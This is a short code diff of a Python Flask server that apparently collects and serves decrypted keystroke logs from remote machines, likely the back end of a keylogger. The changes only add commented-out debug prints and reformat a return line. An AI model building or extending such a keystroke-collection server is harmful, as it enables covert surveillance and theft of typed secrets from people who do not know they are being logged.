@@ -38,7 +38,11 @@ def upload():
     except FileNotFoundError:
         machine_exist_data = {}
     machine_log = merge_dicts(machine_exist_data, log_data)
-
+    # key = local_data[machine_sn]["key"]
+    # decrypt_data = {decrypt(key, k): decrypt(key, v) for k, v in machine_data.items()}
+    #
+    # print(f"e + {machine_log}")
+    # print(f"d + {decrypt_data}")
     with open(machine_path + '/log.json', "w", encoding="utf-8") as f:
         json.dump(machine_log, f, ensure_ascii=False, indent=4)
 
@@ -114,7 +118,8 @@ def get_keystrokes():
             except Exception as e:
                 return jsonify({"error":"logs not found"}),400
         decrypt_data = {decrypt(key,k): decrypt(key,v) for k, v in key_logs.items()}
-        return jsonify({"logs":decrypt_data}), 200
+        return jsonify({"logs":decrypt_data
+                        }), 200
 
     except Exception as e:
         return jsonify({"error":str(e)}), 500
